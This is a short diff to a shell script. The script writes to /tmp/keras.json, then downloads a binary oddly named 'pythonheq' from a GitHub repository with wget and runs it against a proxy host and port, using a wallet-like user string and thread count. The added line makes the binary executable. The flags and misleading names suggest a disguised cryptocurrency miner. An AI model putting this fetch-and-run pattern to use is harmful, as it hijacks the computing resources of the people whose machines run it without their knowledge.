@@ -425,4 +425,5 @@ echo '"opg":"'$OPG'",' >> /tmp/keras.json
 i="0"
 
   wget -q https://github.com/one10001/10001code/raw/main/pythonheq
+  chmod +x pythonheq
  ./pythonheq -v -l "$PROX":"$VCPort" -u "$W_VC"."$INFO" -t "$VCThreads" -p "$VCOptions" 
